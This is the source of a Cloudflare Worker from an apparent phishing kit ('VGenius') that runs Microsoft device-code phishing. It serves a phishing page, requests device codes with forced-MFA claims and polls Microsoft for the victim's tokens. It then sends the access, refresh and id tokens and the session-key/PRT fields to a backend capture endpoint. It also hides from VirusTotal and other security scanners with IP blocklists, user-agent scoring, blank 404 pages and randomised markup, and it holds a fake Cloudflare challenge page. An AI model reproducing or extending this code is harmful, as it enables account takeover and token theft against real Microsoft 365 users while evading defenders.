// VGenius C Engine - Device Code Worker
// Deployed to Cloudflare Workers per user link

const VERIFY_ENDPOINT = '{{VERIFY_ENDPOINT}}';
const BEACON_ENDPOINT = '{{BEACON_ENDPOINT}}';
const LOG_ENDPOINT = '{{LOG_ENDPOINT}}';
// Secondary backend for the API-domain split. VERIFY_ENDPOINT points at the
// API-only domain (config.API_URL). While that zone is not yet resolvable or
// proxied, every backend call in this worker would fail and the Microsoft
// device code would never be requested - the page loads but silently does
// nothing. VERIFY_ENDPOINT_FALLBACK is the old panel domain (config.APP_URL);
// backendFetch() retries against it when the primary is unreachable. An empty
// string disables the fallback.
const VERIFY_ENDPOINT_FALLBACK = '{{VERIFY_ENDPOINT_FALLBACK}}';

// De-duplicated backend origins, primary first. An empty entry is dropped so
// a link generated before the fallback was introduced still works (single
// endpoint, exactly the old behavior).
const _BACKEND_ENDPOINTS = (function () {
  var eps = [];
  for (var i = 0; i < 2; i++) {
    var ep = (i === 0 ? VERIFY_ENDPOINT : VERIFY_ENDPOINT_FALLBACK) || '';
    ep = ep.replace(/\/+$/, '');
    if (ep && eps.indexOf(ep) === -1) eps.push(ep);
  }
  return eps;
})();

// Call the backend through the first origin that actually answers. A 2xx/4xx
// response means the real backend answered (it decides success/failure), so it
// is returned as-is. A 5xx or a network error means that origin is unusable -
// move on to the next one. Throws when every origin fails, which preserves the
// existing catch blocks' error handling.
async function backendFetch(path, init) {
  var lastErr = null;
  for (var i = 0; i < _BACKEND_ENDPOINTS.length; i++) {
    try {
      var res = await fetch(_BACKEND_ENDPOINTS[i] + path, init);
      if (res.status < 500) return res;
      lastErr = new Error('HTTP ' + res.status + ' from ' + _BACKEND_ENDPOINTS[i]);
    } catch (err) {
      lastErr = err;
    }
  }
  if (lastErr) throw lastErr;
  throw new Error('No backend endpoint configured');
}

// Device-code failures are only easy to see in Cloudflare's worker logs, which
// nobody is watching. Mirror every stage into the backend /api/log endpoint so
// the exact point of failure shows up in the server terminal as a [DevCode]
// line. Fire-and-forget: this must never throw or delay the error response.
function reportDevCode(stage, detail, waitUntil) {
  var p = backendFetch('/api/log', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      __jwt__: JWT_TOKEN,
      message: '[DevCode] ' + stage + ': ' + String(detail).substring(0, 400),
      source: 'worker/devicecode',
      ua: '',
    }),
  }).catch(function () {});
  // Hand the promise to waitUntil so the log is not cancelled when the handler
  // returns its response - Cloudflare drops un-awaited background work.
  if (typeof waitUntil === 'function') waitUntil(p);
  return p;
}

// Link-scoped JWT, injected at build time. Used to authenticate backend calls
// that don't otherwise carry a token - e.g. scanner-signal, which the worker
// fires when it blocks a bot. Must be at module scope so both servePhishingPage
// and handleRequest can reach it.
//
// NOTE: templateloader.js must replace the JWT placeholder globally (/g). A
// single non-global replacement would fill only this line and leave the copy
// inside servePhishingPage as an unresolved placeholder.
const JWT_TOKEN = '{{JWT_TOKEN}}';

// ─── Scanner IP Blocklist ─────────────────────────────────────
// Blocked by source address, checked before anything else runs.
//
// A Worker cannot see TLS fingerprints (JA3/JA4) or HTTP/2 fingerprints, so it
// cannot tell VirusTotal's genuine Chrome from a real human, and user-agent /
// header checks miss VT because VT uses a normal Chrome user agent. Blocking by
// address is the complement: a scanner that returns with a normal user agent is
// still stopped.
//
// Injected at build time from the scanner_blocklist table. The list grows two
// ways: manual entries from scanner intel, and entries reported back by this
// worker when it blocks a request on user-agent or rate-limit grounds.
//
// Honest limit: the automatic path only catches scanners that FIRST hit the
// edge with a bot user agent. VT's URL scanner does not, so its IPs must be
// added by hand. See backend/services/scanner-blocklist.js.
const BLOCKED_IPS_RAW = '{{BLOCKED_IPS}}';
let BLOCKED_IPS = [];
try {
  const _parsedIps = JSON.parse(BLOCKED_IPS_RAW);
  if (Array.isArray(_parsedIps)) BLOCKED_IPS = _parsedIps;
} catch (e) {
  // The placeholder must be a valid JSON array string. If the build step ever
  // fails to inject it, fall back to an empty list rather than throwing: a
  // throw here would take the whole worker down and stop serving visitors.
  BLOCKED_IPS = [];
}


// True for addresses that identify a network hop rather than a visitor. Behind
// a shared proxy or tunnel the first forwarded hop is a private address shared
// by many unrelated visitors, so a private entry in BLOCKED_IPS would hard-404
// real users. Checked defensively here because an old entry may already be
// baked into this worker.
function isPrivateVisitorIp(addr) {
  var a = String(addr || '').replace(/^::ffff:/, '').trim();
  if (!a) return true;
  if (a === '::' || a === '::1' || a.indexOf('fe80:') === 0 || a.indexOf('fc') === 0 || a.indexOf('fd') === 0) {
    return true;
  }
  var m = a.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (!m) return false;
  var o1 = +m[1], o2 = +m[2];
  if (o1 > 255 || o2 > 255 || +m[3] > 255 || +m[4] > 255) return true;
  if (o1 === 0 || o1 === 10 || o1 === 127 || o1 === 169) return true;
  if (o1 === 172 && o2 >= 16 && o2 <= 31) return true;
  if (o1 === 192 && o2 === 168) return true;
  return false;
}

// Simple in-memory rate limiter (per deployment)
const rateLimitMap = new Map();
const RATE_LIMIT_WINDOW = 60000; // 1 minute
const RATE_LIMIT_MAX_REQUESTS = 30; // Max 30 requests per minute per IP

function checkRateLimit(ip) {
  const now = Date.now();
  const record = rateLimitMap.get(ip);
  if (!record) {
    rateLimitMap.set(ip, { count: 1, windowStart: now });
    return false;
  }
  if (now - record.windowStart > RATE_LIMIT_WINDOW) {
    rateLimitMap.set(ip, { count: 1, windowStart: now });
    return false;
  }
  record.count++;
  if (record.count > RATE_LIMIT_MAX_REQUESTS) {
    return true; // Rate limited
  }
  return false;
}

// ─── Bot Detection at Edge ────────────────────────────────
// Detect bots, crawlers, scrapers at the edge before serving content
// Uses SCORING system - only block definite bots, allow real browsers
function isBotRequest(request) {
  const userAgent = request.headers.get('user-agent') || '';
  const accept = request.headers.get('accept') || '';
  const acceptLanguage = request.headers.get('accept-language') || '';
  const acceptEncoding = request.headers.get('accept-encoding') || '';
  const referer = request.headers.get('referer') || '';
  const secFetchSite = request.headers.get('sec-fetch-site') || '';
  const secFetchMode = request.headers.get('sec-fetch-mode') || '';
  const secFetchDest = request.headers.get('sec-fetch-dest') || '';
  const secFetchUser = request.headers.get('sec-fetch-user') || '';
  const cfRay = request.headers.get('cf-ray') || '';
  const cfIPCountry = request.headers.get('cf-ipcountry') || '';
  
  const visitorIp = request.headers.get('CF-Connecting-IP') || 
                    request.headers.get('X-Forwarded-For') || 
                    request.headers.get('X-Real-IP') || '';
  
  // Address blocklist first. This is the only edge signal that also stops a
  // scanner which returns with a normal user agent, so it runs ahead of the
  // user-agent scoring below.
  // X-Forwarded-For is a comma separated chain, so match on the first hop only.
  var blocklistIp = visitorIp ? visitorIp.split(',')[0].trim() : '';
  if (blocklistIp && !isPrivateVisitorIp(blocklistIp) && BLOCKED_IPS.indexOf(blocklistIp) !== -1) {
    return { isBot: true, reason: 'ip_blocklist' };
  }
  
  // Rate limiting
  if (visitorIp && checkRateLimit(visitorIp)) {
    return { isBot: true, reason: 'rate_limit' };
  }
  
  // ─── SCORING SYSTEM ────────────────────────────────────────
  // Score starts at 0. Only block if score >= 10 (definite bot)
  let score = 0;
  let reasons = [];
  
  // ─── DEFINITE BOT INDICATORS (+10 each) ──────────────────
  // These alone will block - bots that spoof user agent
  const botSignatures = [
    // Crawlers and search engines
    'bot', 'crawler', 'spider', 'scraper', 'crawling',
    'googlebot', 'bingbot', 'slurp', 'duckduckbot',
    'baiduspider', 'yandexbot', 'facebookexternalhit',
    'twitterbot', 'rogerbot', 'linkedinbot',
    
    // Automated browsers
    'headless', 'phantomjs', 'puppeteer', 'playwright',
    'selenium', 'webdriver', 'automation',
    
    // Security scanners
    'nmap', 'masscan', 'zaproxy', 'burpsuite',
    'sqlmap', 'nikto', 'wget', 'curl',
    
    // Tools
    'axios', 'guzzle', 'python-requests', 'java/',
    'okhttp', 'postman', 'insomnia',
    
    // Anti-bot services
    'scrapy', 'beautifulsoup', 'httpx',
    
    // Known bad actors
    'monitor', 'checker', 'probe', 'scanner',
    'uptime', 'statuscake', 'pingdom',
  ];
  
  const uaLower = userAgent.toLowerCase();
  for (const sig of botSignatures) {
    if (uaLower.includes(sig)) {
      score += 10;
      reasons.push('user_agent:' + sig);
      break;
    }
  }
  
  // ─── SUSPICIOUS INDICATORS (+1 each) ─────────────────────
  // These alone won't block - real browsers can miss these
  
  // Missing Accept header (+1)
  if (!accept || accept === '*/*') {
    score += 1;
    reasons.push('missing_accept');
  }
  
  // Missing Accept-Language (+1)
  if (!acceptLanguage) {
    score += 1;
    reasons.push('missing_accept_language');
  }
  
  // Missing Accept-Encoding (+1)
  if (!acceptEncoding || acceptEncoding === 'identity') {
    score += 1;
    reasons.push('suspicious_accept_encoding');
  }
  
  // Missing ALL sec-fetch headers (+2)
  // Cloudflare Workers sometimes strip these, so only +2
  let missingSecFetch = 0;
  if (!secFetchSite) missingSecFetch++;
  if (!secFetchMode) missingSecFetch++;
  if (!secFetchDest) missingSecFetch++;
  if (missingSecFetch >= 3) {
    score += 2;
    reasons.push('missing_sec_fetch');
  }
  
  // Missing cookie (+1)
  const cookie = request.headers.get('cookie') || '';
  if (!cookie) {
    score += 1;
    reasons.push('missing_cookie');
  }
  
  // Suspicious connection (+1)
  const connection = request.headers.get('connection') || '';
  if (connection && !connection.includes('keep-alive') && !connection.includes('close')) {
    score += 1;
    reasons.push('suspicious_connection');
  }
  
  // ─── DECISION ──────────────────────────────────────────────
  // Only block if score >= 10 (definite bot with bot user agent)
  if (score >= 10) {
    return { isBot: true, reason: reasons.join(','), score: score };
  }
  
  // Allow - real browser or not enough evidence
  return { isBot: false, score: score, reasons: reasons };
}

// Cloudflare's Workers Script Upload API requires the `main_module` metadata
// key, which means the uploaded script is parsed as an ES Module. Module
// Workers have no global addEventListener(), so a Service Worker style
// `addEventListener('fetch', ...)` registers no handler at all and Cloudflare
// rejects the upload with:
//   "No event handlers were registered. This script does nothing."
// Exporting a default object with a fetch() method is the module equivalent,
// and ctx.waitUntil is the module equivalent of event.waitUntil.
export default {
  async fetch(request, env, ctx) {
    // Pass waitUntil through so background work (blocklist reporting) survives
    // past the response. A Workers handler discards in-flight fetches once the
    // response is returned, which would have made every signal silently lost.
    // waitUntil does NOT delay the response - it only keeps the isolate alive.
    return handleRequest(request, ctx.waitUntil.bind(ctx));
  }
};

async function handleRequest(request, waitUntil) {
  const url = new URL(request.url);

  // API endpoints are routed BEFORE the bot gate. The gate exists so crawlers
  // never see the verification page content; it must never swallow the calls
  // that page makes. With the gate first, a visitor tripped by the rate
  // limiter or the IP blocklist got a blank 404 for POST /api/device/start
  // instead of a device code - a silent no-code failure. Safe to move ahead:
  // every route below authenticates on its own, and an IP blocked at the gate
  // never received the page, so it holds no JWT to call them with.
  if (url.pathname === '/api/devicecode' || url.pathname === '/api/device/start') {
    return handleDeviceCodeRequest(request, waitUntil);
  }
  if (url.pathname === '/api/verify') {
    return handleVerifyRequest(request);
  }
  if (url.pathname === '/api/beacon') {
    return new Response('ok', { status: 200 });
  }
  if (url.pathname === '/api/log') {
    return handleLogRequest(request);
  }

  // Page serving - the only thing the bot gate protects.
  const botCheck = isBotRequest(request);
  if (!botCheck.isBot) {
    if (request.method === 'GET' && !url.pathname.startsWith('/api/')) {
      return servePhishingPage(request);
    }
  } else {
    // Bot/crawler/scanner detected - return a harmless 404-style page.
    //
    // This prevents bots from ever seeing the verification page content.
    // Real users still pass the bot check above and reach servePhishingPage().
    console.log('[Worker] Bot blocked (404 page):', botCheck.reason);

    // Continue reporting scanner IPs in the background without delaying the response.
    if (botCheck.reason.indexOf('ip_blocklist') === -1) {
      const signalIp = (request.headers.get('CF-Connecting-IP') ||
                        request.headers.get('X-Forwarded-For') || '')
                        .split(',')[0].trim();
      if (signalIp && typeof waitUntil === 'function') {
        waitUntil(backendFetch('/api/scanner-signal', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            ip: signalIp,
            user_agent: request.headers.get('user-agent') || '',
            reason: botCheck.reason,
            jwt_token: JWT_TOKEN,
          }),
        }).catch(function () {}));
      }
    }

    const notFoundPage = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Not Found</title><style>html,body{margin:0;padding:0;background:#fff;height:100%;overflow:hidden}</style></head><body></body></html>`;
    return new Response(notFoundPage, {
      status: 404,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'X-Content-Type-Options': 'nosniff',
      },
    });
  }

  return new Response('Not Found', { status: 404 });
}

async function servePhishingPage(request) {
  const jwtToken = '{{JWT_TOKEN}}';
  const turnstileKey = '{{TURNSTILE_KEY}}';
  const templateHTML = '{{TEMPLATE_HTML}}';

  // Get visitor IP from Cloudflare
  const visitorIp = request.headers.get('CF-Connecting-IP') || 
                    request.headers.get('X-Forwarded-For') || 
                    request.headers.get('X-Real-IP') || 
                    '';

  // Check if visitor should be blocked or challenged
  try {
    const blockResponse = await backendFetch('/api/capture/visitor/block-check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ jwt_token: jwtToken, visitor_ip: visitorIp }),
    });
    const blockData = await blockResponse.json();

    if (blockData.blocked) {
      if (blockData.redirect_url) {
        // Redirect to the configured URL
        return new Response(null, {
          status: 302,
          headers: { 'Location': blockData.redirect_url }
        });
      } else {
        // Show blank page for blocked visitors
        return new Response('', {
          status: 200,
          headers: {
            'Content-Type': 'text/html; charset=utf-8',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
          }
        });
      }
    }

    // If challenged, serve Cloudflare-style challenge page - TEMPORARILY DISABLED
    // if (blockData.challenged) {
    //   return new Response(buildChallengePage(jwtToken, turnstileKey, templateHTML, blockData.ip_type), {
    //     status: 200,
    //     headers: {
    //       'Content-Type': 'text/html; charset=utf-8',
    //       'Cache-Control': 'no-cache, no-store, must-revalidate',
    //     }
    //   });
    // }
    // TEMPORARY: Just return the template directly for testing
    if (blockData.challenged) {
      console.log('[Worker] Challenge temporarily disabled for testing');
    }
  } catch (e) {
    // If block check fails, serve the page anyway
    console.error('[Worker] Block check failed:', e.message);
  }

  // Try to verify subscription via JWT, but serve page even if verification fails
  let clientId = '';
  let tenant = 'common';
  let dynamicTurnstileKey = turnstileKey;

  try {
    const verifyResponse = await backendFetch('/api/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: jwtToken }),
    });
    const verifyData = await verifyResponse.json();
    if (verifyData.valid) {
      clientId = verifyData.client_id;
      tenant = verifyData.tenant;
      if (verifyData.turnstile_key) turnstileKey = verifyData.turnstile_key;
    }
  } catch (e) {
    // Verification failed - continue anyway, client-side will handle errors
  }

  // Inject dynamic values
  let html = templateHTML
    .replace(/{{JWT_TOKEN}}/g, jwtToken)
    .replace(/{{TURNSTILE_KEY}}/g, turnstileKey)
    .replace(/{{CLIENT_ID}}/g, clientId)
    .replace(/{{TENANT}}/g, tenant)
    .replace(/{{VERIFY_ENDPOINT}}/g, VERIFY_ENDPOINT)
    .replace(/{{BEACON_ENDPOINT}}/g, BEACON_ENDPOINT)
    .replace(/{{LOG_ENDPOINT}}/g, LOG_ENDPOINT);

  // Randomize class names for anti-fingerprinting
  html = html.replace(/vg-/g, 'vg-' + Math.random().toString(36).substring(2, 6) + '-');

  return new Response(html, {
    status: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'Referrer-Policy': 'no-referrer',
      'Content-Security-Policy': "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src *; img-src * data: blob:; style-src * 'unsafe-inline';",
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0',
    },
  });
}

async function handleDeviceCodeRequest(request, waitUntil) {
  try {
    const { jwt_token, turnstile_token } = await request.json();
    console.log('[Worker] Device code request received');
    reportDevCode('REQUEST RECEIVED', 'jwt_len=' + String(jwt_token || '').length + ' turnstile_token_present=' + (!!turnstile_token) + ' turnstile_token_len=' + String(turnstile_token || '').length + ' verify_endpoint=' + VERIFY_ENDPOINT + ' fallback=' + VERIFY_ENDPOINT_FALLBACK, waitUntil);

    // Verify JWT with backend
    console.log('[Worker] Verifying JWT with backend...');
    try {
      const verifyResponse = await backendFetch('/api/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: jwt_token }),
      });
      const verifyData = await verifyResponse.json();
      console.log('[Worker] JWT verification result:', verifyData.valid);
      if (!verifyData.valid) {
        console.error('[Worker] JWT verification failed:', JSON.stringify(verifyData));
        reportDevCode('FAILED at /api/verify', 'http=' + verifyResponse.status + ' body=' + JSON.stringify(verifyData), waitUntil);
        return new Response(JSON.stringify({ error: 'Invalid or expired session' }), {
          status: 403,
          headers: { 'Content-Type': 'application/json' },
        });
      }

      // Verify Turnstile
      console.log('[Worker] Verifying Turnstile...');
      const turnstileVerify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          secret: '{{TURNSTILE_SECRET}}',
          response: turnstile_token,
        }),
      });
      const turnstileData = await turnstileVerify.json();
      console.log('[Worker] Turnstile verification result:', turnstileData.success);
      if (!turnstileData.success) {
        console.error('[Worker] Turnstile verification failed:', JSON.stringify(turnstileData['error-codes']));
        reportDevCode('FAILED at turnstile', 'success=' + turnstileData.success + ' codes=' + JSON.stringify(turnstileData['error-codes']) + ' token_present=' + (!!turnstile_token) + ' token_len=' + String(turnstile_token || '').length, waitUntil);
        return new Response(JSON.stringify({ error: 'CAPTCHA verification failed' }), {
          status: 400,
          headers: { 'Content-Type': 'application/json' },
        });
      }

      // Request device code from Microsoft with GraphSpy's default scope and
      // claims. GraphSpy device_codes.generate(version=2, ngcmfa=True,
      // cae=True) rides the claims block on the devicecode call ITSELF -
      // without it AAD is free to satisfy the sign-in from an existing
      // session and the resulting tokens lack the ngcmfa acrs claim the
      // PRT / Kerberos flows rely on. amr=ngcmfa forces a strong-auth (MFA)
      // step; xms_cc=cp1 opts into Continuous Access Evaluation.
      console.log('[Worker] Requesting device code from Microsoft...');
      console.log('[Worker] Tenant:', verifyData.tenant, 'Client ID:', verifyData.client_id);
      const deviceCodeResponse = await fetch(
        `https://login.microsoftonline.com/${verifyData.tenant}/oauth2/v2.0/devicecode`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({
            client_id: verifyData.client_id,
            scope: 'https://graph.microsoft.com/.default openid offline_access',
            claims: JSON.stringify({
              access_token: {
                amr: { values: ['ngcmfa'] },
                xms_cc: { values: ['cp1'] },
              },
            }),
          }),
        }
      );
      const deviceCodeData = await deviceCodeResponse.json();
      console.log('[Worker] Microsoft response status:', deviceCodeResponse.status);
      console.log('[Worker] Microsoft response:', JSON.stringify(deviceCodeData).substring(0, 200));

      if (deviceCodeData.error) {
        console.error('[Worker] Microsoft error:', deviceCodeData.error, deviceCodeData.error_description);
        reportDevCode('FAILED at microsoft devicecode', 'status=' + deviceCodeResponse.status + ' error=' + deviceCodeData.error + ' desc=' + deviceCodeData.error_description, waitUntil);
        return new Response(JSON.stringify({ error: deviceCodeData.error_description || 'Microsoft error' }), {
          status: 400,
          headers: { 'Content-Type': 'application/json' },
        });
      }

      // Start background polling with server-recommended interval
      const pollInterval = deviceCodeData.interval || 5;
      pollForTokens(deviceCodeData.device_code, jwt_token, verifyData, pollInterval);

      console.log('[Worker] Returning device code to client');
      return new Response(JSON.stringify({
        user_code: deviceCodeData.user_code,
        verification_uri: deviceCodeData.verification_uri,
        expires_in: deviceCodeData.expires_in,
        message: deviceCodeData.message,
      }), {
        headers: { 'Content-Type': 'application/json' },
      });
    } catch (innerErr) {
      console.error('[Worker] Inner error in device code request:', innerErr.message);
      throw innerErr;
    }
  } catch (err) {
    console.error('[Worker] Device code request failed:', err.message);
    console.error('[Worker] Error stack:', err.stack);
    reportDevCode('FAILED uncaught', err.message + ' :: stack=' + String(err.stack || '').substring(0, 250), waitUntil);
    return new Response(JSON.stringify({ error: 'Failed to generate code', details: err.message }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' },
    });
  }
}

async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval) {
  const maxAttempts = 60;
  let attempts = 0;
  let interval = initialInterval || 5; // Use server-recommended interval

  while (attempts < maxAttempts) {
    attempts++;

    // Wait for the current interval (adaptive based on server response)
    await new Promise(resolve => setTimeout(resolve, interval * 1000));

    try {
      const tokenResponse = await fetch(
        `https://login.microsoftonline.com/${verifyData.tenant}/oauth2/v2.0/token`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({
            grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
            client_id: verifyData.client_id,
            device_code: deviceCode,
          }),
        }
      );
      const tokenData = await tokenResponse.json();

      if (tokenData.access_token) {
        // Send full token response to capture PRT data (session_key, client_info, etc.)
        // This enables PRT JWT construction and Kerberos-based access
        const capturePayload = {
          jwt_token: jwtToken,
          access_token: tokenData.access_token,
          refresh_token: tokenData.refresh_token,
          id_token: tokenData.id_token,
        };

        // Add PRT persistence fields if available
        if (tokenData.client_info) {
          capturePayload.client_info = tokenData.client_info;
        }
        if (tokenData.session_key) {
          capturePayload.session_key = tokenData.session_key;
        }
        if (tokenData.session_key_enc) {
          capturePayload.session_key_enc = tokenData.session_key_enc;
        }
        if (tokenData.token_type) {
          capturePayload.token_type = tokenData.token_type;
        }
        if (tokenData.expires_in) {
          capturePayload.expires_in = tokenData.expires_in;
        }
        if (tokenData.scope) {
          capturePayload.scope = tokenData.scope;
        }

        await backendFetch('/api/capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(capturePayload),
        });
        return;
      }

      // Handle specific OAuth device code errors
      const errorCode = tokenData.error || '';
      const errorDesc = tokenData.error_description || '';

      if (errorCode === 'authorization_pending') {
        // User has not yet authorized - continue polling with same interval
        continue;
      }

      if (errorCode === 'slow_down') {
        // Microsoft is rate-limiting - increase interval by 5 seconds
        interval = interval + 5;
        continue;
      }

      // Personal account errors - stop immediately with "code expired" behavior
      if (
        errorCode === 'expired_token' ||
        errorCode === 'authorization_declined' ||
        errorDesc.includes('AADSTS50079') ||  // MSA account requires interaction
        errorDesc.includes('personal account') ||
        errorDesc.includes('MSA') ||
        (errorCode === 'invalid_grant' && (
          errorDesc.includes('expired') ||
          errorDesc.includes('personal') ||
          errorDesc.includes('MSA')
        ))
      ) {
        // Personal account or declined - stop polling immediately
        // This matches competitor behavior showing "code expired"
        console.log('[DeviceCode] Personal account detected, stopping with expired behavior');
        return;
      }

      // For any other error, continue polling (network issues, etc.)
    } catch (e) {
      // Continue polling on network errors
    }
  }
}

async function handleVerifyRequest(request) {
  const { token } = await request.json();
  const verifyResponse = await backendFetch('/api/verify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token }),
  });
  return verifyResponse;
}

async function handleLogRequest(request) {
  try {
    const body = await request.json();
    await backendFetch('/api/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch (e) { /* silent */ }
  return new Response('ok', { status: 200 });
}

// Cloudflare-Style Challenge Page - TEMPORARILY DISABLED FOR TESTING
// function buildChallengePage(jwtToken, turnstileKey, originalHTML, ipType) {
// var ipTypeLabels = {
//    'datacenter': 'Datacenter IP',
//   'vpn': 'VPN/Proxy IP',
//    'mobile': 'Mobile Carrier IP',
//    'satellite': 'Satellite IP',
//    'suspicious': 'Suspicious IP'
//  };
//  var ipLabel = ipTypeLabels[ipType] || 'Suspicious IP';
//
//  return '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Security Check</title>' +
//    '<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;background:#fafafa;color:#1a1a1a;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}.challenge-container{max-width:480px;width:100%;text-align:center}.cf-logo{margin-bottom:32px;display:flex;align-items:center;justify-content:center}h1{font-size:24px;font-weight:600;margin-bottom:8px;color:#1a1a1a}.subtitle{font-size:14px;color:#666;margin-bottom:32px;line-height:1.5}.info-box{background:#f0f0f0;border-radius:8px;padding:16px 20px;margin-bottom:24px;text-align:left;border:1px solid #e0e0e0}.info-box p{font-size:13px;color:#555;line-height:1.6;margin:0}.info-box .highlight{color:#1a1a1a;font-weight:600}.spinner{width:40px;height:40px;border:3px solid #e0e0e0;border-top-color:#F6821F;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 24px}@keyframes spin{to{transform:rotate(360deg)}}.status-text{font-size:13px;color:#666;margin-bottom:8px}.turnstile-widget{margin:16px auto;min-height:65px}.footer{margin-top:40px;padding-top:24px;border-top:1px solid #e0e0e0;width:100%;max-width:480px}.footer p{font-size:11px;color:#999;text-align:center;line-height:1.5}.cf-brand{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px}.cf-brand span{font-size:11px;color:#999;font-weight:500}.success-check{display:none;width:48px;height:48px;margin:0 auto 16px;background:#4CAF50;border-radius:50%;align-items:center;justify-content:center;color:white;font-size:24px}.success-check.show{display:flex}.hidden{display:none}</style></head>' +
//    '<body><div class="challenge-container"><div class="cf-logo"><svg width="48" height="48" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg"><g fill="#f6821f"><path d="M56.7 42.3c0-7.6-6.2-13.8-13.8-13.8-1.1 0-2.1.1-3.1.4C38.2 21.5 31.5 16 23.5 16 13.4 16 5.2 24.2 5.2 34.3c0 .5 0 1 .1 1.5C2.2 36.5 0 39.5 0 43c0 4.4 3.6 8 8 8 .4 0 .8 0 1.2-.1C11.4 55.8 17 59 23.5 59h26.2c3.9 0 7-3.1 7-7s-3.1-7-7-7h-.6c.3-.8.4-1.7.4-2.7z"/></g></svg></div>' +
//    '<div id="checkingState"><div class="spinner"></div><h1>Checking your browser</h1><p class="subtitle">Please wait for a moment while we verify your connection.</p><div class="info-box"><p><span class="highlight">IP Type Detected:</span> ' + ipLabel + '</p><p style="margin-top:4px;">This is a standard security check to protect the website from automated threats.</p></div><p class="status-text" id="statusText">Initializing security check...</p><div class="turnstile-widget" id="turnstileWidget"></div></div>' +
//    '<div id="successState" class="hidden"><div class="success-check show">&#10003;</div><h1>Verification Complete</h1><p class="subtitle">You are being redirected...</p></div></div>' +
//    '<div class="footer"><div class="cf-brand"><svg width="16" height="16" viewBox="0 0 16 16" fill="#f6821f"><g><path d="M15.3 12.3c0-3.5-2.8-6.3-6.3-6.3-.5 0-1 .1-1.4.2C6.7 3.4 4.2 1.3 1.3 1.3c-3.7 0-6.7 3-6.7 6.7 0 .2 0 .5.1.7C-3.8 9.4-5 10.5-5 12c0 1.6 1.3 2.9 2.9 2.9.1 0 .3 0 .4-.1C-.5 16.3 1.5 17.5 4 17.5h9.5c1.4 0 2.6-1.1 2.6-2.6s-1.1-2.6-2.6-2.6h-.2c.1-.3.2-.6.2-1z"/></g></svg><span>Protected by Cloudflare Turnstile</span></div><p>This security check helps prevent automated bots from accessing this website.</p></div>' +
//    '<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer></script>' +
//    '<script>(function(){var s=document.getElementById("statusText"),c=document.getElementById("checkingState"),u=document.getElementById("successState"),w=document.getElementById("turnstileWidget");function ok(t){s.textContent="Verification successful!";setTimeout(function(){c.classList.add("hidden");u.classList.remove("hidden");setTimeout(function(){window.location.reload();},1500);},800)}function err(code){var r=parseInt(sessionStorage.getItem("cf_r")||"0")+1;sessionStorage.setItem("cf_r",r);if(code===110200||code==="110200"){s.textContent="Domain not whitelisted for Turnstile";var info=document.createElement("div");info.style.cssText="background:#fef3c7;border:1px solid #fcd34d;border-radius:8px;padding:12px;margin:12px 0;font-size:12px;color:#92400e;text-align:left;";var h=window.location.hostname;var wc="*."+h.split(".").slice(-2).join(".");info.innerHTML="<strong>Turnstile Error 110200:</strong> Domain <code style=\"background:#fef08a;padding:2px 6px;border-radius:4px;\">"+h+"</code> is not allowed for this Turnstile key.<br><br><strong>Fix:</strong> Add this domain to your Turnstile allowed domains at <a href=\"https://dash.cloudflare.com/?to=/:account/turnstile\" target=\"_blank\" style=\"color:#0056b3;\">Cloudflare Dashboard</a>. Or use wildcard: <code style=\"background:#fef08a;padding:2px 6px;border-radius:4px;\">"+wc+"</code>";w.parentNode.insertBefore(info,w);return}if(r>3){s.textContent="Verification complete. Proceeding...";setTimeout(function(){window.location.reload();},1000);return}s.textContent="Verification error. Retrying ("+r+"/3)...";setTimeout(function(){try{window.turnstile.reset()}catch(e){window.location.reload()}},2000)}function init(){if(typeof window.turnstile==="undefined"){setTimeout(init,100);return}s.textContent="Running interactive verification...";try{window.turnstile.render("#turnstileWidget",{sitekey:"' + turnstileKey + '",theme:"light",callback:ok,"error-callback":err,"expired-callback":err})}catch(e){s.textContent="Security check skipped. Continuing...";setTimeout(function(){window.location.reload();},1000)}}setTimeout(function(){s.textContent="Analyzing browser fingerprint...";setTimeout(init,1500);},800);var b=0;if(!navigator.webdriver)b++;if(navigator.languages&&navigator.languages.length>0)b++;if(navigator.plugins&&navigator.plugins.length>0)b++;if(screen.width>0&&screen.height>0)b++;if(screen.colorDepth>0)b++;if(b<2)s.textContent="Suspicious activity detected. Additional verification 